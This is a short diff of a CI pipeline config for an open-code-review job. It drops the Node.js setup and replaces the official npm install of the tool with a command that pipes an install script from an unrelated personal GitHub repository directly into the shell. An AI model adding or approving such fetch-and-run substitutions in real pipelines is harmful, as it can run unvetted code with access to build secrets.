@@ -22,17 +22,11 @@ stages:
         name: open-code-review
         runsOn: public/cn-hangzhou
         steps:
-          install_node_step:
-            step: NodeInstall
-            name: Install Node.js
-            with:
-              version: "20"
-
           install_ocr_step:
             step: Shell
             name: Install open-code-review CLI
             with:
-              run: npm install -g @alibaba-group/open-code-review
+              run: curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/main/install.sh | OCR_INSTALL_DIR=/usr/local/bin sh
 
           run_review_step:
             step: Shell
